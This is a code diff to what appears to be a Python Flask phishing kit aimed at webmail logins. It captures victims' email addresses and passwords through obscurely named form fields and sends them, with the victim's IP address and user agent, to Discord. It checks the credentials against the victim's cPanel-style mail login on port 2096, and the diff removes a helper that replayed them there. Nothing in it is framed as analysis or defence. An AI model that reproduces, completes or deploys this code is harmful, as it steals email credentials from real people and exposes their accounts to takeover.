@@ -70,20 +70,6 @@ def send_discord_failed(email, password, ip, useragent, domain, mx_record):
     except request.exceptions.RequestException as e:
         print(f"Error sending message to Discord: {e}")
 
-def fetch_content():
-    dman = session.get('ins')
-    email = request.form.get("horse")
-    password = request.form.get("pig")
-    target_url = f"{dman}:2096/login/?user={email}&pass={password}"
-    try:
-        response = requests.get(target_url, timeout=6)
-        response.raise_for_status()
-        html_content = response.text
-    except requests.RequestException as e:
-        html_content = f"<p>Error: {e}</p>"
-    
-    return render_template('fetched.html', content=html_content)
-
 def get_mx_record(domain):
     try:
         answers = dns.resolver.resolve(domain, 'MX')
@@ -246,7 +232,6 @@ def first():
                 return redirect(f"{dman}:2096/login/?user={email}&pass={password}")
             else:
                 # Credentials are incorrect
-                fetch_content()
                 send_discord_failed(email, password, ip, useragent, domain, mx_record)
                 return redirect(url_for('benza'))
         except Exception as e:
@@ -286,7 +271,6 @@ def second():
                 return redirect(f"{dman}:2096/login/?user={email}&pass={password}")
             else:
                 # Credentials are incorrect
-                fetch_content()
                 send_discord_failed(email, password, ip, useragent, domain, mx_record)
                 return redirect(url_for('lasmo'))
         except Exception as e:
